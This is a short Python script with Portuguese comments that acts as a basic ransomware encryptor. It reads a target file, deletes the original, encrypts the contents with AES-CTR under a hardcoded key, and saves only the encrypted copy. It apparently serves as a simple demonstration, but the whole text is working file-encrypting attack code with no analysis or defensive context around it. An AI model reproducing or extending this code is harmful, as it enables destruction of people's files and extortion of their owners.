import os
import pyaes

## Abrindo o arquivo alvo
file_name = "alvo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Deletando o arquivo original
os.remove(file_name)

## Criando a chave de criptografia
key = b"senhaparaencriptaredecriptaralvo"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografando o arquivo alvo
crypto_data = aes.encrypt(file_data)

## Gravando o novo arquivo alvo criptografado
new_file = file_name + "seuarquivocriptografado.txt"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()